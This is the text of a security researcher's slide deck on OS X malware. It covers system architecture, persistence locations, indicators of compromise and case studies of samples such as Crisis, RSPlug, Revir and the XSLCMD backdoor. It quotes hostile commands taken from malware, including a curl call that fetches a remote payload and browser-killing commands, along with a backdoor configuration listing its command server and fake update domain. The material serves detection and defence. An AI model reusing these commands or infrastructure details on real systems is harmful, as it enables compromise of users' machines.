OSX Malware
Plists, Shell Scripts and Object-C Oh-My!
Amanda Stewart Malware Research Engineer
FireEye
The OSX Detection Team & Myself
 Amanda Stewart (HQ)  James (Tom) Bennett (HQ)  Lennard Galang (Singapore)
2

Overview
 Architecture History & Overview  Understanding Resident Applications, Scripts, & Services  OSX Malware Background
- Timeline - Common Infiltration Methods - Common Indicators of Compromise
 OSX Malware Case Studies & Analysis
- Flashback - Geneio - APTs
 Tools & Public Repositories  References
3
OSX Architecture Timeline
4

OSX Architecture ­ High level

GUI

Carbon

Application Environments (API)

[BSD, Carbon, Cocoa, Classic]

Application Services [Quartz, OpenGL, PrintCore]

Quick time

Core Services
[Address Book, Core Data, Core Foundation, Foundation, Quick Look, Social, Security, Webkit]

Kernel [Mach, BSD, I/O Kits, Drivers]

Java
JRE
JDK Packages
JVM

Hardware, Firmware, Bootloader

5

OSX Architecture ­ Low Level

6

Services User Interface Level
· Launchd is responsible for starting the GUI · Metadata framework
· indexing server (/System/ Library/ Frameworks/ CoreServices.framework/Frameworks/ Metadata.framework/ Support/mds)
· mdworker is used to extract the metadata*
Darwin (UNIX Core)
· /bin/sh shell scripts supported · Resident files needs root privileges for modifications.
Malware authors tend to use sudo before modifying property files.
7
File System
8

File System
9
File System UNIX System Directories
· /usr ­ Third party software can install here · /usr/bin ­ utilities and tools · /usr/lib is equivalent to C:\windows\system32 · /tmp directory is available for all writes, reads and executions to all users. Many malware
authors place their binaries in this directory. (symbolically linked /tmp -> /private/tmp)
10

File System OSX Directories
· /Applications ­ default location for all application installations · /Library - support files for system applications. · /Network - Virtual directory for neighbor node discovery and access. · /System ­ system files
· Frameworks (/System/ Library/Frameworks) · Kernel modules (/System/ Library/Extensions)
· /Users ­ user home directories · /Volumes ­ used for mounting network shares or external devices · /Core - Core dumps for process crashes
11
Runnable Apps, Scripts, & Services
Typical runnable scripts, containers and binary types:
· AppleScripts (Used for Apple inter-application communication) · Perl/Python/Bash Scripts · Bourne-again Shell Scripts (Used in BSD based systems) · Extensions (Safari, Chrome, FireFox) · App Bundles (Self Contained Applications)
· Applications (.app) · Frameworks (.framework) · Plugins (.bundle)
12

Runnable Apps, Scripts, & Services
Typical runnable scripts, containers and binary types:
· DMG (App within a HFS container or "disk image") · PKG (App within a XAR container and package installer) · Mach-O ( Binary equivalent to a Windows EXE) · FAT Binaries (Universal Mach-O Binaries that support various
architectures) · I386 Mach-Os · x86_64 Mach-Os · PPC Mach-Os (Discontinued architecture after OSX 10.6)
· Dylibs (Dynamic Libraries) · Kext (Drivers)
13
App Architecture
· App Bundles (.app, .framework, .bundle) · DMG (App within a HFS container or "disk image") · PKG (App within a XAR container and package installer)
All applications have the same directory architecture but exists in a different wrapper. Below is a typical application structure.
Mach-O Binary
14

Plists

· Required file because it
supplies information necessary for the OS to determine dependencies · Supported Natively
· Objective-C - agnostic · Cocoa ­ uses a specific
library to call
Mach-o Reference
Main Function Pointer
15

.NIB or Binary Plists (Compiled Plists)

OSX Kitmos

MainMenu.nib

Must point to the main function the malware is actually using
16

MACH-O
· Mach-O ( Binary equivalent to a Windows EXE) · FAT Binaries (Universal Mach-O Binaries that support various
architectures) · I386 Mach-Os · 64 bit Mach-Os · PPC Mach-Os (Discontinued architecture after OSX 10.6)
OSX native binary format: 0XFEEDFACE

17

MACH-O

Header Load Commands
Raw Segment Data

Segment Examples

LC_SEGMENT

segment_command

LC_LOAD_DYLIB

dylib_command

LC_THREAD LC_UNIXTHREAD

thread_command

LC_CODE_SIGNATUR E

load_code_signature

__TEXT

· Executable Machine Code · Constants · __cstring

__DATA

· Initialized Variables · Symbol Pointers · Placeholders for dynamic content

18

OSX App Development
The development language used was Objective-C which is heavily object-oriented.
Objective-C used in OSX.Crisis (2012)
Rootkit used by governments during targeted attacks. It collects audio, pictures, screenshots, keystrokes and report everything to a remote server. It's known to be delivered through grey market exploits.
__cstring:0004B8AE 00000012 C NSApplicationName - Mach-o main function __cstring:0004E164 00000010 C NSURLConnection ­ Making a typical network connection __cstring:0004D1D6 00000011 C NSBitmapImageRep - Grabbing a screenshot __cstring:0004B010 00000009 C NSScreen ­ Changing the desktop background
19

OSX App Development

Cocoa is implemented with Objective-C and provides libraries and frameworks
to interact with OSX such as User Interfaces. Its considered the preferred application environment for OSX.

Cocoa Frameworks used in OSX.Callme (2013)
Capture ABAddressBook:sharedAddressBook particularly WriteToFile:atomically method (used to copy address book contacts). After capturing this API filter file open/close on AddressBook

__text:000077BB __text:000077C0 __text:000077C4 __text:000077C9 __text:000077CC

mov mov mov mov call

eax, ds:paSharedaddressb [esp+4], eax eax, ds:paAbaddressbook [esp], eax _objc_msgSend

20

OSX Malware
21
OSX Malware
Sorry Steve
22

OSX Malware Evolution Timeline

Jan-08 MacSweep/Immuni
zator
Jun-07 RSPlug/Jahlav

May-11 Olyx

Oct-10 Boonana

May-11 MacDefender

Apr-10 HellRTS

Mar-11 Blackhole

2007

2008

Note: Not all malware is represented here

2010

2011

2012

201

23

an-08 weep/Immuni
zator

OSX Malware Evolution Timeline

Oct-10 Boonana
Apr-10 HellRTS

May-11 Olyx
May-11 MacDefender
Mar-11 Blackhole

Sep-11 Imuler Revir FlashBack

Apr-12 Sabpab
Mar-12 Lamadai HackBack

Sep-12 Wirenet
Jul-12 Crisis

Oct-11 Tsunami DevilRobber

May-12 FileCode
r

08

2010

2011

2012

2013

2

Note: Not all malware is represented here 24

OSX Malware Evolution Timeline

p-11 muler
evir hBack

Apr-12 Sabpab
Mar-12 Lamadai HackBack

Sep-12 Wirenet
Jul-12 Crisis

Oct-11 Tsunami DevilRobber

May-12 FileCode
r

Feb-14 CoinTheif Appetite Careto/Mask

Feb-13 CallMe

Jan-14 LaoShu

Sept-13 Tibet Icefog

Aug-14 XSLCmd

2012

2013

2014

Note: Not all malware is represented here 25

OSX Malware Timeline
2007 ­ January 2013

26

OSX Malware Recent Trends
Virus Total August 2013 ­ August 2014
27
OSX Malware Recent Trends
 Social Engineering  Phishing (Email Attachments)  Decoys (Show image while run in the background)
- .App disguised as a JPEG  Automatic acceptance of unsigned Apps  Primary focus is on Data Theft
- Key logging - Screen Shots - User information (Adware also does this)  Backdoors and Rootkits are rare but mainly used in targeted attacks
28

Summary of OSX Malware IOCs
File system Persistence Examples
 Library/LaunchAgents
- Sabpab ~/Library/LaunchAgents/com.apple.PubSabAgent.plist (auto start plist file) - Crisis Library/LaunchAgents/com.apple.mdworker.plist - Geneio(Adware) ~/Library/LaunchAgents/com.geneio.completer.download.plist - Olyx /Library/LaunchAgents/www.google.com.tstart.plist - CallMe ~/Library/launchagents/systm and ~/Library/launchagents/apple.plist - Imuler/Revir ~/library/LaunchAgents/checkvir.plist - Lamadai ~/Library/LaunchAgents /com.apple.DockActions.plist and ~/Library/LaunchAgents /com.apple.Audio
Service.plist
 Library/Preferences
- Sabpab ~/Library/Preferences/com.apple.PubSabAgent.pfile (malware copy)
 Shared Folders
- SniperSpy Shared/.syslogagent/syslogset.plist - Leverage /Users/Shared/UserEvent.app
 Library/LaunchDaemons
- Geneio(adware) /Library/LaunchDaemons/com.genieoinnovation.macextension.client.plist
 Browser Extensions and Plugins
- Yontoo ~/Library/Safari/Extensions/Extensions.plist - Okaz /Library/Internet Plug-Ins/zako.plugin - RSPLug /Library/Internet Plugins/Mozillplugin.plugin
29
Summary of OSX Malware IOCs
Dynamic Behavior Characteristics  Lazy Authors Using Bash Commands
 Zako - curl -s http://search.nation.com/statistics/?affid=203&amp;cztbid=161582317917443&amp;inst=0&amp;sethp=0&amp; defsearch=0 - killall -9 Google Chrome - killall -z firefox - killall Safari - chown root:staff /Users/root/Library/Safari/Extensions - /usr/bin/sudo -u root /usr/libexec/PlistBuddy -c Print install /private/tmp/com.zako.nation.pkg.config
 RSPlug - cat /Volumes/27/install.pkg/Contents/Resources/preinstall - /Macintosh/usr/bin/sed /\n/!G;s/\(.\)\(.*\n\)/&amp;\2\1/;//D;s/.// - /usr/sbin/scutil - sed -e s/.*PrimaryService : // - grep QuickTime.xpt - sh 1 85.255.113.108 85.255.112.70 - crontab cron.inst - /usr/bin/perl /Library/Internet Plug-Ins//sendreq
 Keylogger.LogKext - /Macintosh/usr/bin/find "/System/Library/Extensions/logKext.kext" -exec /bin/chmod -R g-w {} ;
 Leverage - bash -c ditto '/Applications/DSC00117.app' '/Users/Shared/UserEvent.app'
 Keychaindump - sh -c vmmap 17 30

Summary of OSX Malware IOCs Dynamic Behavior Characteristics  Using Launchd
- Revir launchd -o /tmp/updtdata http://tarmu.narod.ru/cdmax
 System Calls
- BSD calls  Sysctl  task_for_pid  vm_stat  trace  sync  shutdown  hostinfo  File open/close
31
OSX.Flashback
32

OSX.Geneio (Adware)
33
OSX APT Malware XSLCMD
34

OSX APT Malware XSLCMD
35
OSX APT Malware XSLCMD
36

OSX APT Malware XSLCMD

Configuration

[ListenMode] 0 [MServer] 61.128.110.38:8000 [BServer] 61.128.110.38 [Day] 1,2,3,4,5,6,7 [Start Time] 00:00:00 [End Time] 23:59:00 [Interval] 60 [MWeb] http://1234/config.htm

[BWeb] http://1234/config.htm [MWebTrans] 0 [BWebTrans] 0 [FakeDomain] www.appleupdate.biz [Proxy] 0 [Connect] 1 [Update] 0 [UpdateWeb] not use
37

OSX APT Malware XSLCMD
PSEUDO-HTTP

38

Useful Tools and Malware Repos
Tools  "File" command used for determining Architecture  Xcode  dtrace  otool  IdaPro - https://www.hex-rays.com/products/ida/  dmg2img (Linux) - http://vu1tur.eu.org/tools/
Repos  contagiodump.com  virustotal.com (mach-o)
39

The Future?
 Flashback is here to Stay  More advanced attacks
translated from Windows based code  More Windows and OSX payloads  Watering Holes  Social Engineering Continues

Morcut Jar

40

References
· Joel Yonts. Mar 2009. Mac OS X Malware Analysis. http://digitalforensics.sans.org/community/papers/gcfa/mac-os-malware-analysis_2286
· Levin, Jonathan (2012-11-05). Mac OS X and iOS Internals: To the Apple's Core (Kindle Locations 873-882). Wiley.
· http://nakedsecurity.sophos.com/2012/07/25/mac-malware-crisis-onmountain-lion-eve/
· http://www.thesafemac.com/arg-genieo/ · http://www.f-secure.com/v-descs/trojan-downloader_osx_flashback_i.shtml · http://www.fireeye.com/blog/technical/malware-research/2014/09/forced-to-
adapt-xslcmd-backdoor-now-on-os-x.html · https://www.hex-rays.com/products/ida/ · http://vu1tur.eu.org/tools/
41

